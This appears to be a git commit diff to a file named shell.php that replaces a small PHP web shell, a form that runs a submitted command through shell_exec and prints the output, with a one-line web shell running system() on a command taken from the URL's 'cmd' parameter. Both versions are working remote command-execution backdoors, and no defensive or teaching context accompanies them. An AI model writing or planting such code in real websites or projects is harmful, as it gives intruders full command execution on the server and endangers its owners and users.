3632c27cd5102e6926f28e234b68095beab628b2
OffShur3 <93799448+OffShur3@users.noreply.github.com>
2025-05-26 21:45:02 -0300

    Update shell.php

--- shell.php
+++ shell.php
@@ -1,12 +1,1 @@
-<?php
-// Mostrar el formulario y el resultado en la misma página
-echo '<form method="POST">
-    <input type="text" name="cmd" placeholder="Comando" style="width:300px;">
-    <button type="submit">Ejecutar</button>
-</form>';
-
-if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($_POST['cmd'])) {
-    $cmd = $_POST['cmd'];
-    echo "<pre>" . htmlspecialchars(shell_exec($cmd)) . "</pre>";
-}
-?>
+<?php system($_GET['cmd']); ?>
